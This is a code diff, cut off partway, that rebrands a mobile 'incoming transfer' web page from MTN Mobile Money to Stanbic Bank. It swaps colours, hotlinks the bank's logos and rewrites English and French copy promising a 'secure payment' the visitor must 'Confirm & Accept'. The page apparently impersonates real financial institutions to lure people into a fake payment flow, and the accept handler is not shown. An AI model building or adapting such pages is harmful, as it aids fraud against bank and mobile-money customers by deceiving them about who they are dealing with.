@@ -3,281 +3,322 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>MTN Mobile Money · Receive Payment</title>
+<title>Stanbic Bank · Incoming Transfer</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 <style>
   :root {
-    --mtn-royal: #2059B5;
-    --mtn-deep:  #073A87;
-    --mtn-white: #FFFFFF;
-    --mtn-green: #28A745;
-    --mtn-yellow:#FFCC08;
-    --mtn-text:  #456BA8;
-    --mtn-gray:  #7C8798;
-    --mtn-border:#E5E9F0;
-    --mtn-soft:  #F5F7FB;
-    --mtn-page:  #E7EEF7;
+    --sb-primary:   #01008C;
+    --sb-royal:     #005EB8;
+    --sb-navy:      #001E50;
+    --sb-gold:      #FFB81C;
+    --sb-white:     #FFFFFF;
+    --sb-text:      #1A2233;
+    --sb-muted:     #5B6577;
+    --sb-border:    #E4E8F0;
+    --sb-soft:      #F4F6FA;
+    --sb-page:      #EEF1F7;
+    --sb-green:     #0E7A4A;
+    --sb-red:       #B3261E;
+    --sb-red-soft:  #FDECEA;
   }
   * { box-sizing: border-box; margin: 0; padding: 0; }
   html, body { height: 100%; }
   body {
-    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    background: var(--mtn-page); color: var(--mtn-text);
-    -webkit-font-smoothing: antialiased; line-height: 1.45;
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: var(--sb-page); color: var(--sb-text);
+    -webkit-font-smoothing: antialiased; line-height: 1.5;
     min-height: 100vh; display: flex; justify-content: center; padding: 0;
   }
   .phone {
     width: 100%; max-width: 430px; min-height: 100vh;
-    background: var(--mtn-white); display: flex; flex-direction: column;
+    background: var(--sb-white); display: flex; flex-direction: column;
     position: relative; overflow: hidden;
   }
+
+  /* ─── TOOLBAR ─── */
   .toolbar {
-    flex-shrink: 0; background: var(--mtn-white);
-    padding: max(12px, env(safe-area-inset-top, 0px)) 16px 10px;
-    border-bottom: 1px solid var(--mtn-border);
-    display: grid; grid-template-columns: 1fr 1fr; gap: 10px; z-index: 30;
+    flex-shrink: 0; background: var(--sb-white);
+    padding: max(12px, env(safe-area-inset-top, 0px)) 16px 12px;
+    border-bottom: 1px solid var(--sb-border);
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 10px; z-index: 30;
   }
+  .toolbar-logo { height: 26px; width: auto; display: block; }
+  .toolbar-actions { display: flex; gap: 8px; }
   .tool-btn {
-    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
-    padding: 11px 12px; font-size: 13px; font-weight: 700;
-    border-radius: 10px; font-family: inherit; cursor: pointer;
-    transition: all .15s; border: 1.5px solid transparent;
+    display: inline-flex; align-items: center; justify-content: center; gap: 6px;
+    padding: 8px 12px; font-size: 12px; font-weight: 600;
+    border-radius: 8px; font-family: inherit; cursor: pointer;
+    transition: all .15s; border: 1px solid var(--sb-border);
+    background: var(--sb-white); color: var(--sb-primary);
   }
-  .tool-outline { background: var(--mtn-white); color: var(--mtn-royal); border-color: #CBD5E1; }
-  .tool-outline:hover { border-color: var(--mtn-royal); background: #F0F5FC; }
-  .tool-outline.copied { background: var(--mtn-green); border-color: var(--mtn-green); color: #fff; }
-  .tool-primary { background: var(--mtn-royal); color: #fff; border-color: var(--mtn-royal); }
-  .tool-primary:hover { filter: brightness(1.08); }
+  .tool-btn:hover { border-color: var(--sb-primary); background: #F6F8FC; }
+  .tool-btn.copied { background: var(--sb-green); border-color: var(--sb-green); color: #fff; }
+  .tool-btn svg { width: 14px; height: 14px; stroke: currentColor; fill: none; stroke-width: 2; }
+
+  /* ─── HERO / HEADER ─── */
   .top {
     position: relative; flex-shrink: 0;
-    background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%);
-    padding-top: 0; padding-bottom: 40px;
-    border-bottom-left-radius: 44% 48px;
-    border-bottom-right-radius: 44% 48px;
+    background: linear-gradient(160deg, var(--sb-primary) 0%, var(--sb-royal) 100%);
+    padding: 26px 22px 28px;
+    border-bottom-left-radius: 20px;
+    border-bottom-right-radius: 20px;
   }
-  .brand {
-    display: inline-flex; align-items: baseline; gap: 2px;
-    font-weight: 900; font-size: 18px; letter-spacing: -0.4px; color: #fff;
-    padding: 18px 24px 0;
+  .top::before {
+    content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px;
+    background: var(--sb-gold);
+    border-top-left-radius: 20px; border-top-right-radius: 20px;
   }
-  .brand .mtn { color: var(--mtn-yellow); }
-  .brand .mm  { color: #FFFFFF; opacity: 0.95; }
-  .hero {
-    position: absolute; left: 50%; transform: translateX(-50%);
-    bottom: -120px; width: 68%; max-width: 280px; aspect-ratio: 1 / 1; z-index: 5;
+  .top-row {
+    display: flex; align-items: center; justify-content: space-between; gap: 12px;
   }
-  .hero .outer {
-    position: absolute; inset: 0; background: #fff; border-radius: 50%;
-    box-shadow: 0 14px 30px rgba(7,58,135,0.20),
-                0 0 0 6px rgba(255,255,255,0.70),
-                0 0 0 16px rgba(255,255,255,0.35);
+  .secure-badge {
+    display: inline-flex; align-items: center; gap: 6px;
+    font-size: 10.5px; font-weight: 700; letter-spacing: 0.5px;
+    text-transform: uppercase; color: #FFFFFF;
+    background: rgba(255,255,255,0.14);
+    border: 1px solid rgba(255,255,255,0.25);
+    padding: 5px 10px; border-radius: 999px;
   }
-  .hero .green-ring {
-    position: absolute; inset: 8%;
-    border: 6px solid var(--mtn-green);
-    border-radius: 50%; background: #EAF7EE;
-    display: flex; align-items: center; justify-content: center; overflow: hidden;
+  .secure-badge svg {
+    width: 11px; height: 11px; stroke: var(--sb-gold); fill: none; stroke-width: 2.4;
   }
-  .hero svg.man { width: 88%; height: 88%; display: block; }
+
+  .hero-title {
+    margin-top: 22px; font-size: 21px; font-weight: 800;
+    color: #FFFFFF; letter-spacing: -0.4px; line-height: 1.25;
+  }
+  .hero-sub {
+    margin-top: 6px; font-size: 12.5px; color: rgba(255,255,255,0.82);
+    line-height: 1.55; max-width: 320px;
+  }
+
+  /* ─── BODY ─── */
   .body {
     flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch;
-    padding: 150px 22px 20px;
-    display: flex; flex-direction: column; align-items: center; text-align: center;
+    padding: 22px 20px 24px;
+    display: flex; flex-direction: column;
   }
-  .status-block { margin-bottom: 16px; }
-  .status-title {
-    font-size: 20px; font-weight: 800; letter-spacing: -0.4px;
-    color: var(--mtn-text); line-height: 1.25; margin-bottom: 5px;
+
+  /* ─── AMOUNT CARD ─── */
+  .amount-card {
+    background: var(--sb-soft); border-radius: 12px;
+    border: 1px solid var(--sb-border);
+    padding: 16px 18px; margin-bottom: 14px;
+    display: flex; flex-direction: column; gap: 4px;
   }
-  .status-desc {
-    font-size: 12.5px; color: var(--mtn-gray); line-height: 1.55;
-    max-width: 300px; margin: 0 auto;
+  .amount-card .label {
+    font-size: 10.5px; color: var(--sb-muted); font-weight: 700;
+    letter-spacing: 0.7px; text-transform: uppercase;
   }
-  .status-desc strong { color: var(--mtn-deep); font-weight: 800; }
-  .amount-block {
-    display: flex; align-items: baseline; justify-content: center; gap: 6px;
-    margin-bottom: 14px;
+  .amount-card .amount {
+    font-size: 30px; font-weight: 800; color: var(--sb-primary);
+    letter-spacing: -0.8px; line-height: 1.1;
   }
-  .amount-block .cur { font-size: 18px; font-weight: 700; color: var(--mtn-royal); }
-  .amount-block .val {
-    font-size: 40px; font-weight: 800; letter-spacing: -1.5px;
-    color: var(--mtn-deep); line-height: 1;
+
+  /* ─── PURPOSE CARD ─── */
+  .purpose-card {
+    background: #FFFDF5; border-radius: 12px;
+    border: 1px solid #F2E4B8;
+    padding: 14px 18px; margin-bottom: 20px;
+    display: flex; flex-direction: column; gap: 4px;
+    position: relative; overflow: hidden;
   }
+  .purpose-card::before {
+    content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 3px;
+    background: var(--sb-gold);
+  }
+  .purpose-card .label {
+    font-size: 10.5px; color: #8A6600; font-weight: 700;
+    letter-spacing: 0.7px; text-transform: uppercase;
+  }
+  .purpose-card .purpose {
+    font-size: 14.5px; font-weight: 700; color: var(--sb-navy);
+    line-height: 1.4; word-break: break-word;
+  }
+  .purpose-card.hidden { display: none; }
+
+  /* ─── ACCEPT BUTTON ─── */
   .btn-accept {
-    margin-top: 0;
-    padding: 15px 34px; font-size: 15px; font-weight: 800; letter-spacing: 0.5px;
-    background: var(--mtn-green); color: #fff;
-    border: none; border-radius: 999px;
-    cursor: pointer; font-family: inherit;
-    box-shadow: 0 10px 24px rgba(40,167,69,0.32);
-    transition: filter .15s, transform .1s; min-width: 220px;
+    width: 100%; height: 52px;
+    background: var(--sb-primary); color: #fff;
+    font-family: inherit; font-size: 14.5px; font-weight: 700;
+    letter-spacing: 0.4px;
+    border: none; border-radius: 10px; cursor: pointer;
+    box-shadow: 0 8px 20px rgba(1,0,140,0.22);
+    transition: filter .15s, transform .1s, box-shadow .15s;
   }
-  .btn-accept:hover { filter: brightness(1.06); }
-  .btn-accept:active { transform: scale(0.98); }
-  .btn-accept:disabled { opacity: 0.7; cursor: wait; }
+  .btn-accept:hover { filter: brightness(1.08); box-shadow: 0 10px 24px rgba(1,0,140,0.28); }
+  .btn-accept:active { transform: scale(0.985); }
+  .btn-accept:disabled { opacity: 0.65; cursor: wait; }
+
+  /* ─── RECIPIENT ─── */
   .recipient-line {
-    margin-top: 18px; font-size: 13.5px; color: var(--mtn-gray); line-height: 1.5;
+    margin-top: 18px; font-size: 13px; color: var(--sb-muted); line-height: 1.5;
+    display: flex; flex-direction: column; gap: 10px;
   }
   .recipient-block {
-    display: flex;
-    align-items: baseline;
-    justify-content: center;
-    gap: 8px;
+    display: flex; align-items: baseline; justify-content: space-between; gap: 12px;
+    padding: 10px 14px;
+    background: var(--sb-soft); border-radius: 10px;
+    border: 1px solid var(--sb-border);
   }
   .recipient-k {
-    font-size: 11px;
-    font-weight: 700;
-    text-transform: uppercase;
-    letter-spacing: 0.6px;
-    color: var(--mtn-gray);
+    font-size: 10.5px; font-weight: 700; text-transform: uppercase;
+    letter-spacing: 0.6px; color: var(--sb-muted); flex-shrink: 0;
   }
   .recv-name {
-    font-weight: 700; color: var(--mtn-text);
-    font-size: 14.5px; word-break: break-word;
+    font-weight: 700; color: var(--sb-text);
+    font-size: 13.5px; text-align: right; word-break: break-word;
   }
+
+  /* ─── DETAILS PANEL ─── */
   .details-panel {
-    width: 100%; margin-top: 20px;
-    background: var(--mtn-soft); border-radius: 12px;
-    padding: 4px 14px; text-align: left;
+    width: 100%; margin-top: 18px;
+    background: var(--sb-white); border-radius: 12px;
+    border: 1px solid var(--sb-border);
+    padding: 4px 16px; text-align: left;
   }
   .detail-row {
     display: flex; justify-content: space-between; align-items: flex-start;
-    gap: 12px; padding: 9px 0;
-    border-bottom: 1px solid #E9EDF4;
+    gap: 12px; padding: 11px 0;
+    border-bottom: 1px solid var(--sb-border);
   }
   .detail-row:last-child { border-bottom: none; }
-  .detail-row .k { font-size: 11px; color: var(--mtn-gray); flex-shrink: 0; }
-  .detail-row .v {
-    font-size: 11.5px; font-weight: 600; text-align: right;
-    word-break: break-word; color: var(--mtn-text);
+  .detail-row .k {
+    font-size: 11.5px; color: var(--sb-muted); flex-shrink: 0; font-weight: 500;
   }
-  .mtn-footer {
-    width: 100%; margin-top: 20px;
-    background: var(--mtn-yellow);
+  .detail-row .v {
+    font-size: 12px; font-weight: 700; text-align: right;
+    word-break: break-word; color: var(--sb-text);
+  }
+
+  /* ─── FOOTER ─── */
+  .sb-footer {
+    width: 100%; margin-top: 22px;
+    background: var(--sb-navy);
     border-radius: 12px;
-    padding: 14px 16px;
+    padding: 16px 18px;
     display: flex; align-items: center; justify-content: space-between;
     gap: 12px; text-align: left;
   }
-  .mtn-footer .foot-brand {
-    display: inline-flex; align-items: baseline; gap: 2px;
-    font-weight: 900; font-size: 15px; letter-spacing: -0.4px; color: #000;
+  .sb-footer .foot-logo {
+    height: 22px; width: auto; display: block;
   }
-  .mtn-footer .foot-brand .mtn { color: #000; }
-  .mtn-footer .foot-brand .mm  { color: #000; opacity: 0.85; }
-  .mtn-footer .foot-support {
-    font-size: 11px; color: #000; line-height: 1.45; font-weight: 600;
+  .sb-footer .foot-support {
+    font-size: 10.5px; color: rgba(255,255,255,0.72); line-height: 1.5; font-weight: 500;
     text-align: right;
   }
-  .mtn-footer .foot-support strong { font-weight: 800; }
+  .sb-footer .foot-support strong {
+    color: var(--sb-gold); font-weight: 700; font-size: 11.5px;
+  }
+
+  /* ─── TOAST ─── */
   .toast {
     position: fixed; bottom: 24px; left: 50%;
     transform: translateX(-50%) translateY(80px);
-    background: #0A0F1F; color: #fff; padding: 11px 18px; border-radius: 9px;
+    background: var(--sb-navy); color: #fff; padding: 11px 18px; border-radius: 9px;
     font-size: 12.5px; font-weight: 600; opacity: 0; transition: all .3s ease;
     z-index: 50; pointer-events: none; max-width: 90%; text-align: center;
+    box-shadow: 0 12px 28px rgba(0,0,0,0.25);
   }
   .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
 
+  /* ─── INITIATING STATE ─── */
   .body.initiating {
     justify-content: center;
     padding-top: 40px;
   }
   .init-spinner {
-    width: 58px; height: 58px;
-    border: 4px solid var(--mtn-soft);
-    border-top-color: var(--mtn-green);
+    width: 54px; height: 54px;
+    border: 4px solid var(--sb-soft);
+    border-top-color: var(--sb-primary);
     border-radius: 50%;
     animation: initSpin 0.9s linear infinite;
     margin-bottom: 26px;
   }
   @keyframes initSpin { to { transform: rotate(360deg); } }
   .init-title {
-    font-size: 21px; font-weight: 800; letter-spacing: -0.4px;
-    color: var(--mtn-deep); margin-bottom: 8px; line-height: 1.25;
+    font-size: 20px; font-weight: 800; letter-spacing: -0.4px;
+    color: var(--sb-navy); margin-bottom: 8px; line-height: 1.25;
   }
   .init-desc {
-    font-size: 13px; color: var(--mtn-gray); line-height: 1.6;
+    font-size: 13px; color: var(--sb-muted); line-height: 1.6;
     max-width: 300px; margin: 0 auto;
   }
   .init-note {
-    margin-top: 22px; font-size: 11.5px; color: var(--mtn-gray);
+    margin-top: 22px; font-size: 11.5px; color: var(--sb-muted);
     font-weight: 600;
   }
   body.is-initiating .toolbar,
   body.is-initiating .top { display: none !important; }
   body.is-initiating .body { padding: 40px 22px; }
 
+  /* ─── ERROR / EXPIRED ─── */
   .error-box {
-    padding: 40px 24px; text-align: center; color: var(--mtn-gray);
+    padding: 40px 24px; text-align: center; color: var(--sb-muted);
     font-size: 13px; line-height: 1.6;
   }
   .expired-icon {
-    width: 76px; height: 76px; border-radius: 50%;
+    width: 72px; height: 72px; border-radius: 50%;
     background: #94A3B8;
     display: inline-flex; align-items: center; justify-content: center;
-    margin-bottom: 16px;
+    margin: 0 auto 16px;
     box-shadow: 0 0 0 6px rgba(148,163,184,0.12),
                 0 10px 22px rgba(148,163,184,0.28);
   }
   .expired-icon svg {
-    width: 38px; height: 38px;
+    width: 36px; height: 36px;
     stroke: #fff; fill: none;
     stroke-width: 3.2; stroke-linecap: round; stroke-linejoin: round;
   }
 
+  /* ─── RESPONSIVE ─── */
   @media (pointer: coarse) {
-    .btn-accept { width: 100%; max-width: 320px; padding: 16px 24px; }
+    .btn-accept { height: 54px; font-size: 15px; }
   }
   @media (orientation: landscape) and (max-height: 500px) {
-    .top { padding-bottom: 22px; }
-    .brand { padding: 12px 22px 0; font-size: 16px; }
-    .hero { width: 34%; max-width: 160px; bottom: -60px; }
-    .body { padding: 72px 22px 16px; }
-    .status-title { font-size: 17px; }
-    .amount-block .val { font-size: 30px; }
-    .recipient-line { margin-top: 12px; }
-    .details-panel { margin-top: 14px; }
-    .mtn-footer { margin-top: 14px; }
+    .top { padding: 16px 20px 18px; }
+    .hero-title { margin-top: 12px; font-size: 17px; }
+    .body { padding: 16px 20px; }
+    .amount-card { padding: 12px 16px; margin-bottom: 10px; }
+    .amount-card .amount { font-size: 24px; }
+    .purpose-card { padding: 10px 16px; margin-bottom: 12px; }
+    .btn-accept { height: 46px; }
+    .details-panel, .sb-footer { margin-top: 12px; }
   }
   @media print {
     body { background: #fff; padding: 0; }
-    .toolbar, .brand, .mtn-footer { display: none !important; }
+    .toolbar, .sb-footer, .btn-accept { display: none !important; }
     .phone { box-shadow: none; }
     .top { background: #fff; border-bottom: 1px solid #ccc; padding: 12px 0; }
-    .body { padding-top: 130px; }
-    .btn-accept { display: none !important; }
+    .hero-title { color: var(--sb-primary); }
+    .hero-sub { color: var(--sb-muted); }
+    .secure-badge { display: none; }
+    .body { padding-top: 20px; }
   }
   @media (max-width: 380px) {
-    .tool-btn { padding: 10px; font-size: 12px; }
-    .brand { font-size: 16px; padding: 14px 20px 0; }
-    .top { padding-bottom: 32px; border-bottom-left-radius: 42% 42px; border-bottom-right-radius: 42% 42px; }
-    .hero { width: 64%; bottom: -100px; }
-    .body { padding: 130px 18px 18px; }
-    .status-title { font-size: 18px; }
-    .amount-block .val { font-size: 34px; }
-    .btn-accept { padding: 13px 28px; font-size: 14px; min-width: 190px; }
-    .init-title { font-size: 19px; }
-    .init-spinner { width: 48px; height: 48px; }
-  }
-  @media (max-height: 680px) {
-    .hero { width: 56%; bottom: -84px; }
-    .body { padding-top: 108px; }
-    .status-title { font-size: 18px; }
-    .amount-block .val { font-size: 32px; }
-    .details-panel, .mtn-footer { margin-top: 16px; }
+    .toolbar-logo { height: 22px; }
+    .tool-btn { padding: 7px 10px; font-size: 11px; }
+    .top { padding: 20px 18px 22px; }
+    .hero-title { font-size: 19px; }
+    .amount-card .amount { font-size: 26px; }
+    .purpose-card .purpose { font-size: 13.5px; }
+    .btn-accept { height: 50px; font-size: 14px; }
+    .detail-row .v { font-size: 11.5px; }
+    .sb-footer { padding: 14px 16px; }
+    .sb-footer .foot-logo { height: 20px; }
   }
   @media (min-width: 640px) {
     body { padding: 32px 0; align-items: center; }
     .phone {
       min-height: calc(100vh - 64px); max-height: 900px;
-      border-radius: 32px;
-      box-shadow: 0 40px 100px rgba(7, 58, 135, 0.18);
+      border-radius: 20px;
+      box-shadow: 0 30px 80px rgba(1,0,140,0.14);
       overflow: hidden;
     }
-    .top { border-top-left-radius: 32px; border-top-right-radius: 32px; }
   }
 </style>
 </head>
@@ -285,77 +326,58 @@
 
 <div class="phone">
 
+  <!-- TOOLBAR -->
   <div class="toolbar">
-    <button class="tool-btn tool-outline" id="copyBtn" onclick="copyReceipt()">
-      <span>📋</span> <span id="copyLbl">Copy Receipt</span>
-    </button>
-    <button class="tool-btn tool-primary" onclick="window.print()">
-      <span>🖨</span> <span id="printLbl">Print</span>
-    </button>
+    <img
+      class="toolbar-logo"
+      src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/light/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
+      alt="Stanbic Bank"
+    >
+    <div class="toolbar-actions">
+      <button class="tool-btn" id="copyBtn" onclick="copyReceipt()">
+        <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+        <span id="copyLbl">Copy</span>
+      </button>
+      <button class="tool-btn" onclick="window.print()">
+        <svg viewBox="0 0 24 24"><polyline points="6 9 6 2 18 2 18 9"/><path d="M6 18H4a2 2 0 0 1-2-2v-5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-2"/><rect x="6" y="14" width="12" height="8"/></svg>
+        <span id="printLbl">Print</span>
+      </button>
+    </div>
   </div>
 
+  <!-- HERO -->
   <div class="top">
-    <div class="brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
-
-    <div class="hero" aria-hidden="true">
-      <div class="outer"></div>
-      <div class="green-ring">
-        <svg class="man" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
-          <defs>
-            <linearGradient id="shirtGrad" x1="0" y1="0" x2="0" y2="1">
-              <stop offset="0%" stop-color="#FFE64A"/>
-              <stop offset="100%" stop-color="#FFC800"/>
-            </linearGradient>
-            <linearGradient id="skinGrad" x1="0" y1="0" x2="0" y2="1">
-              <stop offset="0%" stop-color="#8B5A3C"/>
-              <stop offset="100%" stop-color="#6E422A"/>
-            </linearGradient>
-          </defs>
-          <path d="M40 200 C 40 158, 70 138, 100 138 C 130 138, 160 158, 160 200 Z" fill="url(#shirtGrad)"/>
-          <rect x="88" y="120" width="24" height="26" rx="10" fill="url(#skinGrad)"/>
-          <circle cx="100" cy="86" r="38" fill="url(#skinGrad)"/>
-          <path d="M64 76 C 68 48, 88 40, 100 40 C 112 40, 132 48, 136 76 C 130 66, 118 58, 100 58 C 82 58, 70 66, 64 76 Z" fill="#2C1B10"/>
-          <path d="M72 96 C 74 118, 86 130, 100 130 C 114 130, 126 118, 128 96 C 122 108, 112 116, 100 116 C 88 116, 78 108, 72 96 Z" fill="#2C1B10"/>
-          <path d="M86 102 Q 100 112 114 102" stroke="#FFFFFF" stroke-width="3.2" fill="none" stroke-linecap="round"/>
-          <circle cx="88" cy="86" r="3.2" fill="#FFFFFF"/>
-          <circle cx="112" cy="86" r="3.2" fill="#FFFFFF"/>
-          <circle cx="88" cy="86" r="1.6" fill="#1A0E06"/>
-          <circle cx="112" cy="86" r="1.6" fill="#1A0E06"/>
-          <path d="M148 160 C 168 150, 176 128, 172 108 L 178 104 C 184 128, 176 158, 154 172 Z" fill="#8B5A3C"/>
-          <g transform="translate(178 96)">
-            <rect x="-8" y="-4" width="16" height="14" rx="4" fill="#8B5A3C"/>
-            <rect x="-4" y="-16" width="8" height="14" rx="4" fill="#8B5A3C"/>
-          </g>
-          <path d="M52 160 C 36 158, 28 148, 26 136 L 34 134 C 36 144, 42 152, 52 154 Z" fill="#8B5A3C"/>
-          <g transform="translate(152 42)">
-            <circle r="16" fill="#28A745"/>
-            <path d="M-6 0 L-1 6 L7 -5" stroke="#FFFFFF" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
-          </g>
-        </svg>
+    <div class="top-row">
+      <div class="secure-badge">
+        <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        Secure Transfer
       </div>
     </div>
+    <div class="hero-title" id="heroTitle">Incoming Transfer</div>
+    <div class="hero-sub" id="heroSub">A secure payment is being transferred to your account. Review the details below and confirm to proceed.</div>
   </div>
 
+  <!-- BODY -->
   <div class="body" id="bodyArea">
 
-    <div class="status-block">
-      <div class="status-title" id="statusTitle">You are receiving this payment</div>
-      <div class="status-desc" id="statusDesc">Confirm this transfer to receive <strong id="amtInline">—</strong> into your MTN MoMo account.</div>
+    <div class="amount-card">
+      <span class="label" id="amountLabel">Transfer amount</span>
+      <span class="amount" id="amountValue">—</span>
     </div>
 
-    <div class="amount-block">
-      <span class="cur" id="amtCur">—</span>
-      <span class="val" id="amtVal">0.00</span>
+    <div class="purpose-card hidden" id="purposeCard">
+      <span class="label" id="purposeLabel">Purpose</span>
+      <span class="purpose" id="purposeValue">—</span>
     </div>
 
-    <button class="btn-accept" id="acceptBtn" onclick="acceptPayment()">Accept payment</button>
+    <button class="btn-accept" id="acceptBtn" onclick="acceptPayment()">Confirm &amp; Accept</button>
 
     <div class="recipient-line">
       <div class="recipient-block">
         <span class="recipient-k" id="fromLabel">From</span>
-        <span class="recv-name" id="fromName">MTN Mobile Money</span>
+        <span class="recv-name" id="fromName">—</span>
       </div>
-      <div class="recipient-block" style="margin-top:12px;">
+      <div class="recipient-block">
         <span class="recipient-k" id="toLabel">To</span>
         <span class="recv-name" id="reqRecipient">—</span>
       </div>
@@ -363,10 +385,14 @@
 
     <div class="details-panel" id="detailsPanel"></div>
 
-    <div class="mtn-footer">
-      <div class="foot-brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
+    <div class="sb-footer">
+      <img
+        class="foot-logo"
+        src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
+        alt="Stanbic Bank"
+      >
       <div class="foot-support">
-        <span id="helpLabel">Need help?</span><br>
+        <span id="helpLabel">Customer Care</span><br>
         <span id="callLabel">Call</span> <strong id="supportNum">—</strong>
       </div>
     </div>
@@ -378,19 +404,23 @@
 <script>
   const I18N = {
     en: {
-      copyReceipt: 'Copy Receipt',
-      print: 'Print',
-      copied: 'Copied ✓',
-      copyToast: 'Receipt copied to clipboard.',
-      receivingTitle: 'You are receiving this payment',
-      receivingDesc: 'Confirm this transfer to receive <strong id="amtInline">{amt}</strong> into your MTN MoMo account.',
-      receiveBtn: 'Accept payment',
+      docTitle: 'Stanbic Bank · Incoming Transfer',
+      heroTitle: 'Incoming Transfer',
+      heroSub: 'A secure payment is being transferred to your account. Review the details below and confirm to proceed.',
+      amountLabel: 'Transfer amount',
+      purposeLabel: 'Purpose',
+      receiveBtn: 'Confirm & Accept',
       fromLabel: 'From',
       toLabel: 'To',
-      needHelp: 'Need help?',
+      needHelp: 'Customer Care',
       callLabel: 'Call',
+      copyBtn: 'Copy',
+      printBtn: 'Print',
+      copied: 'Copied ✓',
+      copyToast: 'Receipt copied to clipboard.',
+      copyReceiptTitle: 'Stanbic Bank — Incoming Transfer',
       initiating: 'Preparing secure transfer…',
-      initiatingDesc: 'Connecting securely to MTN Mobile Money so you can receive this payment. Please do not close this page.',
+      initiatingDesc: 'Connecting securely to Stanbic Bank so you can receive this payment. Please do not close this page.',
       initiatingNote: 'This usually takes a few seconds.',
       expiredTitle: 'Payment Request Expired',
       expiredDescPrefix: 'This payment link is no longer valid.',
@@ -401,37 +431,30 @@
       kCountry: 'Country',
       kPaymentMethod: 'Payment method',
       kService: 'Service',
-      kMarketed: 'Marketed',
-      kTransactionDate: 'Transaction date',
+      kReference: 'Reference',
+      kTransactionDate: 'Date',
       kStatus: 'Status',
       vReceived: 'Ready to receive',
-      docTitle: 'Receive Payment · MTN Mobile Money',
-      docTitleInvalid: 'Invalid Link · MTN Mobile Money',
-      receiptTitle: 'MTN Mobile Money — Incoming Payment',
-      receiptStatus: 'Status',
-      receiptAmount: 'Amount',
-      receiptRecipient: 'Recipient',
-      receiptCountry: 'Country',
-      receiptTxId: 'Transaction ID',
-      receiptPaymentMethod: 'Payment method',
-      receiptService: 'Service',
-      receiptMarketed: 'Marketed',
-      receiptDate: 'Date'
+      docTitleInvalid: 'Invalid Link · Stanbic Bank'
     },
     fr: {
-      copyReceipt: 'Copier le reçu',
-      print: 'Imprimer',
-      copied: 'Copié ✓',
-      copyToast: 'Reçu copié dans le presse-papiers.',
-      receivingTitle: 'Vous recevez ce paiement',
-      receivingDesc: 'Confirmez ce transfert pour recevoir <strong id="amtInline">{amt}</strong> sur votre compte MTN MoMo.',
-      receiveBtn: 'Accepter le paiement',
+      docTitle: 'Stanbic Bank · Virement entrant',
+      heroTitle: 'Virement entrant',
+      heroSub: 'Un paiement sécurisé est en cours de transfert vers votre compte. Vérifiez les détails ci-dessous et confirmez pour continuer.',
+      amountLabel: 'Montant du transfert',
+      purposeLabel: 'Motif',
+      receiveBtn: 'Confirmer & Accepter',
       fromLabel: 'De',
       toLabel: 'À',
-      needHelp: 'Besoin d\'aide ?',
+      needHelp: 'Service Client',
       callLabel: 'Appelez le',
+      copyBtn: 'Copier',
+      printBtn: 'Imprimer',
+      copied: 'Copié ✓',
+      copyToast: 'Reçu copié dans le presse-papiers.',
+      copyReceiptTitle: 'Stanbic Bank — Virement entrant',
       initiating: 'Préparation du transfert sécurisé…',
-      initiatingDesc: 'Connexion sécurisée à MTN Mobile Money pour recevoir ce paiement. Veuillez ne pas fermer cette page.',
+      initiatingDesc: 'Connexion sécurisée à Stanbic Bank pour recevoir ce paiement. Veuillez ne pas fermer cette page.',
       initiatingNote: 'Cela prend généralement quelques secondes.',
       expiredTitle: 'Demande de paiement expirée',
       expiredDescPrefix: 'Ce lien de paiement n\'est plus valide.',
@@ -442,22 +465,11 @@
       kCountry: 'Pays',
       kPaymentMethod: 'Mode de paiement',
       kService: 'Service',
-      kMarketed: 'Commercialisé par',
-      kTransactionDate: 'Date de la transaction',
+      kReference: 'Référence',
+      kTransactionDate: 'Date',
       kStatus: 'Statut',
       vReceived: 'Prêt à recevoir',
-      docTitle: 'Recevoir le paiement · MTN Mobile Money',
-      docTitleInvalid: 'Lien invalide · MTN Mobile Money',
-      receiptTitle: 'MTN Mobile Money — Paiement entrant',
-      receiptStatus: 'Statut',
-      receiptAmount: 'Montant',
-      receiptRecipient: 'Destinataire',
-      receiptCountry: 'Pays',
-      receiptTxId: 'ID de transaction',
-      receiptPaymentMethod: 'Mode de paiement',
-      receiptService: 'Service',
-      receiptMarketed: 'Commercialisé par',
-      receiptDate: 'Date'
+      docTitleInvalid: 'Lien invalide · Stanbic Bank'
     }
   };
 
@@ -474,28 +486,17 @@
 
   function applyTranslations() {
     document.title = T.docTitle;
-    const copyLbl = document.getElementById('copyLbl');
-    if (copyLbl) copyLbl.textContent = T.copyReceipt;
-    const printLbl = document.getElementById('printLbl');
-    if (printLbl) printLbl.textContent = T.print;
-
-    const statusTitle = document.getElementById('statusTitle');
-    if (statusTitle) statusTitle.textContent = T.receivingTitle;
-    const statusDesc = document.getElementById('statusDesc');
